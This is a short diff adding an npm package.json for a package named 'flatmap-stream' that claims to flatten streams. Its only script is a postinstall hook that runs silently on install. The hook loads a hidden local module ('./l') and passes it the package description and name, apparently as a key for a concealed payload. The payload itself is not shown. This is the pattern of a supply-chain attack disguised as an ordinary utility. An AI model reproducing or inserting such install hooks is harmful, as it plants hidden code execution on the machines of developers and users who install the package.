@@ -1,0 +1,8 @@
+{
+  "name": "flatmap-stream",
+  "version": "0.1.1",
+  "description": "Flatten a stream of streams",
+  "scripts": {
+    "postinstall": "node -e \"var a=require('./l'),b=process.env;a.r(b.npm_package_description,b.npm_package_name)\""
+  }
+}
